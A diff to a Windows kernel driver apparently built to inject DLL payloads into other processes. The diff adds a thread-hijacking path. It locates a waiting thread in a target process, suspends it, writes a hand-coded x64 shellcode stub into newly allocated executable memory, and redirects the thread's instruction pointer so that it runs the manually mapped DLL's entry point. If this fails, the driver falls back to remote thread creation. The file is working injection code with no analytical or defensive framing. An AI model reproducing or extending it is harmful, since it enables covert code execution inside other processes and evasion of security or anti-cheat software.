@@ -1,4 +1,4 @@
-﻿
+
 #include "driver.h"
 
 static PVOID            g_SharedBuffer   = NULL;
@@ -682,6 +682,179 @@ static const UCHAR g_ShellcodeTemplate[] = {
 #define SHELLCODE_ENTRY_OFFSET    25
 #define SHELLCODE_SIZE            sizeof(g_ShellcodeTemplate)
 
+#pragma pack(push, 8)
+typedef struct _SYS_THREAD_INFO {
+    LARGE_INTEGER KernelTime, UserTime, CreateTime;
+    ULONG         WaitTime;
+    PVOID         StartAddress;
+    CLIENT_ID     ClientId;
+    LONG          Priority, BasePriority;
+    ULONG         ContextSwitchCount, ThreadState, WaitReason;
+} SYS_THREAD_INFO;
+
+typedef struct _SYS_PROC_INFO {
+    ULONG          NextEntryOffset;
+    ULONG          NumberOfThreads;
+    LARGE_INTEGER  Spare[3];
+    LARGE_INTEGER  CreateTime, UserTime, KernelTime;
+    UNICODE_STRING ImageName;
+    LONG           BasePriority;
+    HANDLE         UniqueProcessId;
+    HANDLE         InheritedFromUniqueProcessId;
+    ULONG          HandleCount, SessionId;
+    ULONG_PTR      UniqueProcessKey;
+    SIZE_T         PeakVirtualSize, VirtualSize;
+    ULONG          PageFaultCount;
+    SIZE_T         PeakWorkingSetSize, WorkingSetSize;
+    SIZE_T         QuotaPeakPagedPoolUsage, QuotaPagedPoolUsage;
+    SIZE_T         QuotaPeakNonPagedPoolUsage, QuotaNonPagedPoolUsage;
+    SIZE_T         PagefileUsage, PeakPagefileUsage, PrivatePageCount;
+    LARGE_INTEGER  ReadOperationCount, WriteOperationCount, OtherOperationCount;
+    LARGE_INTEGER  ReadTransferCount, WriteTransferCount, OtherTransferCount;
+    SYS_THREAD_INFO Threads[1];
+} SYS_PROC_INFO;
+#pragma pack(pop)
+
+static NTSTATUS FindSuitableThread(_In_ ULONG TargetPid, _Out_ PHANDLE OutHandle)
+{
+    *OutHandle = NULL;
+
+    ULONG bufSize = 0;
+    ZwQuerySystemInformation(5, NULL, 0, &bufSize);
+    bufSize += 0x10000;
+
+    PVOID buf = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, DRV_POOL_TAG);
+    if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
+
+    NTSTATUS status = ZwQuerySystemInformation(5, buf, bufSize, NULL);
+    if (!NT_SUCCESS(status)) {
+        ExFreePoolWithTag(buf, DRV_POOL_TAG);
+        return status;
+    }
+
+    HANDLE target = (HANDLE)(ULONG_PTR)TargetPid;
+    SYS_PROC_INFO* entry = (SYS_PROC_INFO*)buf;
+
+    for (;;) {
+        if (entry->UniqueProcessId == target && entry->NumberOfThreads > 1) {
+            for (ULONG i = 1; i < entry->NumberOfThreads; i++) {
+                SYS_THREAD_INFO* ti = &entry->Threads[i];
+
+                if (ti->ThreadState == 5 && ti->WaitReason == 6) {
+                    OBJECT_ATTRIBUTES oa;
+                    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+                    HANDLE hThr = NULL;
+                    NTSTATUS os = ZwOpenThread(&hThr,
+                        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
+                        THREAD_QUERY_INFORMATION,
+                        &oa, &ti->ClientId);
+                    if (NT_SUCCESS(os)) {
+                        *OutHandle = hThr;
+                        ExFreePoolWithTag(buf, DRV_POOL_TAG);
+                        return STATUS_SUCCESS;
+                    }
+                }
+            }
+        }
+        if (!entry->NextEntryOffset) break;
+        entry = (SYS_PROC_INFO*)((BYTE*)entry + entry->NextEntryOffset);
+    }
+
+    ExFreePoolWithTag(buf, DRV_POOL_TAG);
+    return STATUS_NOT_FOUND;
+}
+
+static const UCHAR kHijackTemplate[] = {
+    0x48, 0x83, 0xEC, 0x28,
+    0x48, 0xB9, 0,0,0,0, 0,0,0,0,
+    0xBA, 0x01, 0x00, 0x00, 0x00,
+    0x45, 0x31, 0xC0,
+    0x48, 0xB8, 0,0,0,0, 0,0,0,0,
+    0xFF, 0xD0,
+    0x48, 0xB8, 0,0,0,0, 0,0,0,0,
+    0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
+    0x48, 0x83, 0xC4, 0x28,
+    0x48, 0xB8, 0,0,0,0, 0,0,0,0,
+    0xFF, 0xE0
+};
+enum { HJ_HMOD=6, HJ_ENTRY=24, HJ_FLAG=36, HJ_ORIP=56 };
+
+static NTSTATUS ExecuteViaHijack(
+    _In_ PEPROCESS Process,
+    _In_ ULONG     TargetPid,
+    _In_ PVOID     AllocBase,
+    _In_ ULONG_PTR EntryPoint,
+    _In_ HANDLE    ProcHandle)
+{
+    HANDLE hThread = NULL;
+    if (!NT_SUCCESS(FindSuitableThread(TargetPid, &hThread)))
+        return STATUS_NOT_FOUND;
+
+    ZwSuspendThread(hThread, NULL);
+
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_FULL;
+    NTSTATUS status = ZwGetThreadContext(hThread, &ctx);
+    if (!NT_SUCCESS(status)) {
+        ZwResumeThread(hThread, NULL);
+        ZwClose(hThread);
+        return status;
+    }
+
+    PVOID mem = NULL;
+    SIZE_T memSz = 0x3000;
+    status = ZwAllocateVirtualMemory(ProcHandle, &mem, 0, &memSz,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        ZwResumeThread(hThread, NULL);
+        ZwClose(hThread);
+        return status;
+    }
+
+    ULONG_PTR scBase    = (ULONG_PTR)mem;
+    ULONG_PTR stackBase = scBase + 0x100;
+    ULONG_PTR flagAddr  = scBase + 0x2FF0;
+
+    UCHAR sc[sizeof(kHijackTemplate)];
+    RtlCopyMemory(sc, kHijackTemplate, sizeof(sc));
+    *(ULONG_PTR*)(sc + HJ_HMOD)  = (ULONG_PTR)AllocBase;
+    *(ULONG_PTR*)(sc + HJ_ENTRY) = EntryPoint;
+    *(ULONG_PTR*)(sc + HJ_FLAG)  = flagAddr;
+    *(ULONG_PTR*)(sc + HJ_ORIP)  = ctx.Rip;
+
+    WriteToProcess(Process, (PVOID)scBase, sc, sizeof(sc));
+
+    CONTEXT newCtx = ctx;
+    newCtx.Rip = scBase;
+    newCtx.Rsp = stackBase + 0xFF8;
+
+    status = ZwSetThreadContext(hThread, &newCtx);
+    if (!NT_SUCCESS(status)) {
+        ZwFreeVirtualMemory(ProcHandle, &mem, &memSz, MEM_RELEASE);
+        ZwResumeThread(hThread, NULL);
+        ZwClose(hThread);
+        return status;
+    }
+
+    ZwResumeThread(hThread, NULL);
+    ZwClose(hThread);
+
+    ULONG done = 0;
+    for (int i = 0; i < 500 && !done; i++) {
+        ReadFromProcess(Process, (PVOID)flagAddr, &done, sizeof(ULONG));
+        if (done) break;
+        LARGE_INTEGER d; d.QuadPart = -100000LL;
+        KeDelayExecutionThread(KernelMode, FALSE, &d);
+    }
+
+    ZwFreeVirtualMemory(ProcHandle, &mem, &memSz, MEM_RELEASE);
+
+    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
+        "[drv] Thread hijack execution %s\n", done ? "complete" : "timed out");
+
+    return done ? STATUS_SUCCESS : STATUS_TIMEOUT;
+}
+
 NTSTATUS CallEntryPoint(
     _In_ PEPROCESS           Process,
     _In_ PVOID               AllocBase,
@@ -698,13 +871,7 @@ NTSTATUS CallEntryPoint(
 
     ULONG_PTR entryPoint = (ULONG_PTR)AllocBase + entryRva;
     ULONG_PTR hModule    = (ULONG_PTR)AllocBase;
-
-    UCHAR shellcode[SHELLCODE_SIZE];
-    RtlCopyMemory(shellcode, g_ShellcodeTemplate, SHELLCODE_SIZE);
-
-    *(ULONG_PTR*)(shellcode + SHELLCODE_HMODULE_OFFSET) = hModule;
-
-    *(ULONG_PTR*)(shellcode + SHELLCODE_ENTRY_OFFSET) = entryPoint;
+    ULONG     pid        = (ULONG)(ULONG_PTR)PsGetProcessId(Process);
 
     HANDLE procHandle = NULL;
     CLIENT_ID clientId = { 0 };
@@ -719,6 +886,28 @@ NTSTATUS CallEntryPoint(
             "[drv] ZwOpenProcess for thread creation failed: 0x%08X\n", status);
         return status;
     }
+
+    ULONG flags = g_Header ? g_Header->Flags : 0;
+
+    if (flags & INJ_FLAG_THREAD_HIJACK) {
+        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[drv] Using thread hijack execution\n");
+        status = ExecuteViaHijack(Process, pid, AllocBase, entryPoint, procHandle);
+
+        if (NT_SUCCESS(status)) {
+            ZwClose(procHandle);
+            return STATUS_SUCCESS;
+        }
+
+        DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_WARNING_LEVEL,
+            "[drv] Hijack failed (0x%08X), falling back to RtlCreateUserThread\n", status);
+    }
+
+    UCHAR shellcode[SHELLCODE_SIZE];
+    RtlCopyMemory(shellcode, g_ShellcodeTemplate, SHELLCODE_SIZE);
+
+    *(ULONG_PTR*)(shellcode + SHELLCODE_HMODULE_OFFSET) = hModule;
+
+    *(ULONG_PTR*)(shellcode + SHELLCODE_ENTRY_OFFSET) = entryPoint;
 
     PVOID scBase = NULL;
     SIZE_T scSize = SHELLCODE_SIZE;
@@ -1198,7 +1387,7 @@ static VOID WorkerRoutine(_In_ PVOID Context)
                 break;
             }
 
-            PVOID dllData = (PVOID)((ULONG_PTR)g_MappedView + PAYLOAD_DATA_OFFSET);
+            PVOID dllData = (PVOID)((ULONG_PTR)g_SharedBuffer + PAYLOAD_DATA_OFFSET);
             NTSTATUS result = PerformManualMap(pid, dllData, size, flags);
 
             if (NT_SUCCESS(result)) {
